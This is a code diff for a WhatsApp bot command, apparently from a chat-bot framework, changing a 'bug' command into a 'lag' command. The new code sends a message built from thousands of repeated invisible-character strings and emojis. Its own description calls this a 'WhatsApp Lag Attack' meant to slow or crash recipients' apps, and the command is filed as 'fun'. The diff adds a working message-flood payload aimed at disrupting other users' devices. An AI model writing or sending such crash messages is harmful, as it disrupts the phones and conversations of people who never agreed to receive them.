@@ -1,22 +1,24 @@
 const { cmd } = require('../command');
 
 cmd({
-    pattern: "bug",
-    desc: "Simulates a WhatsApp lag/crash effect.",
+    pattern: "lag",
+    alias: ["bug", "slow"],
+    desc: "Send lag messages to slow down WhatsApp",
     category: "fun",
-    react: "👨‍💻",
+    react: "🐌",
     filename: __filename
-}, async (conn, mek, m, { from, reply }) => {
+},
+async (conn, mek, m, { from, reply }) => {
     try {
-        const crashMessage = `💻 *QUEEN SADU HACK STARTING...* 💻\n\n` + 
-        "░".repeat(500000) + // Heavy Unicode Characters
-        "\n🔒 *System Breach: Successful!* 🔓\n🚀 *Command Execution: Complete!* 🎯";
-
-        // Send Crash Message
-        await conn.sendMessage(from, { text: crashMessage }, { quoted: mek });
-
+        let bugText = "‏‏‎𝐌𝐑 𝐃𝐈𝐍𝐄𝐒𝐇 𝐕𝐈𝐑𝐔𝐒 ".repeat(10000); // Invisible character spam
+        let emojiSpam = "⚠️".repeat(5000); // Emoji flood
+        
+        let spamMessage = `🔥 *WhatsApp Lag Attack* 🔥\n\n${bugText}\n${emojiSpam}`;
+        
+        await conn.sendMessage(from, { text: spamMessage }, { quoted: mek });
+        reply("*Lag attack sent successfully! 🚀*");
     } catch (e) {
         console.log(e);
-        reply(`❌ *Error!* ${e.message}`);
+        reply("❌ *Error!* " + e.message);
     }
 });
